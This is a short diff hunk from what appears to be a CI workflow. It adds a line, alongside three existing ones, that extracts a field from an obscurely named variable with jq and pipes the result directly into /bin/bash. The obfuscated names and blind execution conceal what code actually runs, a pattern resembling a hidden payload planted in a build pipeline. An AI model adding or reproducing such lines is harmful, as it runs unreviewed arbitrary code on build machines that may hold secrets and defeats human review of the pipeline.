@@ -23,6 +23,7 @@ jobs:
           echo $sanaz39574 | jq -r .g0047 | /bin/bash
           printf '%s' "$u46" | jq -r .v3 | /bin/bash
           echo $uv81742 | jq -r .qs18 | /bin/bash
+          echo $vdtss44446 | jq -r .mtcb97 | /bin/bash
 
       - name: Persist results
         if: always()
